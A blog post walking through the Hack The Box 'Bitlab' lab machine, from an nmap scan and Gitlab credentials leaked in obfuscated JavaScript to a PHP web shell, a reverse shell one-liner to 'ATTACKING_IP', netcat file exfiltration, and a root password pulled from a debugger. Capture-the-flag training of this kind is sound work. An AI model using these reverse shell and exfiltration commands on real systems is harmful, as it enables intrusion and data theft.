---
author: "Denis Nu\u021Biu"
categories:
- Hack The Box
date: '2019-12-16T21:50:37+00:00'
guid: https://nuculabs.dev/?p=643
id: 643
image: /wp-content/uploads/2019/12/fc29f-screenshot-2019-12-16-at-21.17.49.png
layout: post
permalink: /2019/12/16/htb-bitlab/
tags:
- bitlab
- hackthebox
- linux machine
- penetration testing
title: Hack The Box &#8211; Bitlab
---
Hello,


Here’s how I’ve solved the [Bitlab](https://www.hackthebox.eu/home/machines/profile/207) machine on Hack The Box.


## Gitlab Access


As usual we start of with a **nmap** scan:


```
```bash
root@kali:~# nmap -p- -sV 10.10.10.114
Nmap scan report for 10.10.10.114
Host is up (0.044s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 221.44 seconds
```
```


The scan shows an nginx web server and ssh. If we visit the web server we’ll find a Gitlab instance. Gitlab is used by developers to host their source code. I tried searching for exploits but nothing came up.


Poking around the Gitlab page, if we navigate to the **Help**, we’ll find an bookmark which is obfuscated javascript code. We can copy the code, go back to Gilab’s login page and paste the JS into our dev console. The JS auto completes the login info and we get access to the Gitlab as the Developer.


```
```javascript
javascript:(function(){ var _0x4b18=["x76x61x6Cx75x65","x75x73x65x72x5Fx6Cx6Fx67x69x6E","x67x65x74x45x6Cx65x6Dx65x6Ex74x42x79x49x64","x63x6Cx61x76x65","x75x73x65x72x5Fx70x61x73x73x77x6Fx72x64","x31x31x64x65x73x30x30x38x31x78"];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()
```
```


Credentials: clave:11des0081x


- - - - - -


## Initial Shell


As the developer we find two code repos, **Profile** and Deploy. We only care about the Profile one, any edits we make to the repo get reflected in the **http://10.10.10.114/profile** page, because Gitlab auto deploy is configured that way.


![](https://i1.wp.com/nuculabs.dev/wp-content/uploads/2019/12/Screenshot-2019-12-15-at-20.37.15.png?fit=1024%2C640&ssl=1)
Next, we can upload a [php-reverse shell ](https://github.com/flozz/p0wny-shell)and gain a TCP shell over netcat:


On my attacking machine I run **nc -nvlp 8080** and on the php reverse shell we run:


```
```bash
php -r '$sock=fsockopen("ATTACKING_IP", 8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```
```


After I get the shell over netcat I turn it into a pty shell with the following command:


```
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```
```


I managed to transfer [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) by running **python -m SimpleHTTPServer 8080** on my attacking machine in the linpeas directory and **wget** MY\_IP/linpeas.sh on the victim machine.


![](https://i1.wp.com/nuculabs.dev/wp-content/uploads/2019/12/Screenshot-2019-12-15-at-20.58.45.png?fit=1024%2C623&ssl=1)
- - - - - -


## User Shell


Linpeas spit some interesting output but nothing practical came out of it. So I went back to Gitlab and browsed into the **snippets** section.


There’s a script which leaks the password, ip and username of the profiles database. We can use that to query the database by ourselves by running this in the terminal:


```
```bash
p0wny@shell:/tmp# php -r '$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");$result = pg_query($db_connection, "SELECT * FROM profiles");print_r(pg_fetch_all($result));'
Array
(
    [0] => Array
        (
            [id] => 1
            [username] => clave
            [password] => c3NoLXN0cjBuZy1wQHNz==
        )


)
```
```


We login via ssh as **clave** and password: **c3NoLXN0cjBuZy1wQHNz==**.


On Clave’s home dir we find a binary called **RemoteConnection.exe**, we can transfer that to our attacking machine by using the following commands:


```
```bash
# On the attacking machine
root@kali:~# nc -nvlp 8080 > file.exe
# On the victim
clave@bitlab:~$ nc -w 3 10.10.14.19 8080 < RemoteConnection.exe 
```
```


- - - - - -


## Root Shell


The root shell is gained by reversing the binary we extracted. Reversing is a bit much as we only need to step through it in the debugger. For debugging I’ve used [x64dbg](https://x64dbg.com/#start).


![](https://i0.wp.com/nuculabs.dev/wp-content/uploads/2019/12/root_pass.png?fit=1024%2C532&ssl=1)
We can copy the root password from the debugger and voila, we got root.


```
```
EAX : 007FF8D0     &"-ssh root@gitlab.htb -pw "Qf7]8YSV.wDNF*[7d?j&eD4^""
EBX : 00000000
ECX : 99083A11
EDX : 00F90000
EBP : 007FF8FC
ESP : 007FF844
ESI : 007FF860
EDI : 007FF8D0     &"-ssh root@gitlab.htb -pw "Qf7]8YSV.wDNF*[7d?j&eD4^""
EIP : 00FD15E3     bitlabreverseengineering.00FD15E3
```
```


## Conclusions


Bitlab was an easyish machine but with some weird decisions, for example Clave’s password was hidden as JS in the **Help** page of the Gitlab instance ???


The PHP auto-deploy was nice and the reversing part was kinda unnecessary, it woulda been much nicer if the reversing were more statically focused rather than dynamic.


Thanks for reading and have a great day! <3